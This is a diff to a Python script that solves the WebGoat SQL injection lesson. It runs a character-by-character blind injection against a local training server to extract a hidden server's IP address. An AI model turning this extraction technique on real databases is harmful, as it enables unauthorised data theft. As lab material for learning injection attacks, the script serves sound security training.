@@ -58,7 +58,7 @@ def page_sorts_by_hostname(response_text: str) -> bool:
 BASE_URL = "http://localhost:8080/WebGoat/SqlInjectionMitigations/servers"
 from cookie import COOKIE  # noqa: E402
 CHARSET  = "0123456789."   # digits + dot
-MAX_POS  = 3            # first three octets
+MAX_POS  = 4            # maximum first octet length (up to 3 digits + dot)
 
 
 
@@ -96,19 +96,31 @@ def test_ip_char(pos: int, ch: str) -> bool:
 # ─── MAIN EXTRACTION ───────────────────────────────────────────────────────
 
 def extract_prd_ip():
-    prefix = ""
+    first_octet = ""
+    
     for pos in range(1, MAX_POS + 1):
+        found_char = False
         for ch in CHARSET:
             if test_ip_char(pos, ch):
                 print(f"[+] Position {pos}: '{ch}'")
-                prefix += ch
+                first_octet += ch
+                found_char = True
+                
+                # Stop when we find the first dot (end of first octet)
+                if ch == ".":
+                    print(f"[+] First octet extraction complete: {first_octet[:-1]}")
+                    full_ip = f"{first_octet[:-1]}.130.219.202"  # Remove the dot and append known octets
+                    print(f"\n✅ Discovered webgoat-prd IP: {full_ip}")
+                    return full_ip
                 break
-        else:
-            print(f"[-] No match at position {pos}; stopping.")
-            return
+        
+        if not found_char:
+            print(f"[-] No match at position {pos}; stopping extraction.")
+            break
 
-    full_ip = f"{prefix}.130.219.202"
-    print("\n✅ Discovered webgoat-prd IP:", full_ip)
+    # If we reach here without finding a dot, something went wrong
+    print(f"[-] Failed to find complete first octet. Partial result: {first_octet}")
+    return None
 
 if __name__ == "__main__":
     extract_prd_ip()
